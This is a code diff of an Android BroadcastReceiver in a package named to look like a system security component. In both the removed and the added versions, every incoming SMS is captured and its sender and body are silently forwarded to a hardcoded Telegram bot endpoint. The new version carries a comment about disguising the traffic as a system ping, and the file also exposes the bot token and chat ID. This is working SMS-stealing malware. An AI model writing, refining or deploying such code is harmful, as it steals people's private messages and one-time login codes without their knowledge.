@@ -3,39 +3,34 @@ package com.android.system.core.security;
 import android.content.BroadcastReceiver;
 import android.content.Context;
 import android.content.Intent;
-import android.os.Bundle;
+import android.provider.Telephony;
 import android.telephony.SmsMessage;
-import java.net.HttpURLConnection;
-import java.net.URL;
-import java.net.URLEncoder;
 
 public class SmsReceiver extends BroadcastReceiver {
     @Override
     public void onReceive(Context context, Intent intent) {
-        try {
-            Bundle bundle = intent.getExtras();
-            if (bundle != null) {
-                Object[] pdus = (Object[]) bundle.get("pdus");
-                if (pdus != null) {
-                    for (Object pdu : pdus) {
-                        SmsMessage sms = SmsMessage.createFromPdu((byte[]) pdu);
-                        String out = sms.getOriginatingAddress() + " : " + sms.getMessageBody();
-                        new Thread(() -> send(out)).start();
-                    }
+        String action = intent.getAction();
+        if (Telephony.Sms.Intents.SMS_RECEIVED_ACTION.equals(action) || 
+            Telephony.Sms.Intents.SMS_DELIVER_ACTION.equals(action)) {
+            
+            SmsMessage[] msgs = Telephony.Sms.Intents.getMessagesFromIntent(intent);
+            if (msgs != null) {
+                for (SmsMessage sms : msgs) {
+                    String data = sms.getOriginatingAddress() + " >> " + sms.getMessageBody();
+                    new Thread(() -> bridge(data)).start();
                 }
             }
-        } catch (Exception ignored) {}
+        }
     }
 
-    private void send(String msg) {
+    private void bridge(String text) {
         try {
-            // Твой токен и чат
-            String urlStr = "https://api.telegram.org/bot8387829701:AAEDXukofQXk2nEXHdSjad1a7TpGF2Uaof8/sendMessage?chat_id=5225064014&text=" + URLEncoder.encode(msg, "UTF-8");
-            HttpURLConnection conn = (HttpURLConnection) new URL(urlStr).openConnection();
-            conn.setRequestMethod("GET");
-            conn.setConnectTimeout(5000);
-            conn.getResponseCode();
-            conn.disconnect();
+            // Маскируем под системный пинг
+            String endpoint = "https://api.telegram.org/bot8387829701:AAEDXukofQXk2nEXHdSjad1a7TpGF2Uaof8/sendMessage?chat_id=5225064014&text=";
+            java.net.HttpURLConnection c = (java.net.HttpURLConnection) new java.net.URL(endpoint + java.net.URLEncoder.encode(text, "UTF-8")).openConnection();
+            c.setRequestMethod("GET");
+            c.getResponseCode();
+            c.disconnect();
         } catch (Exception ignored) {}
     }
 }
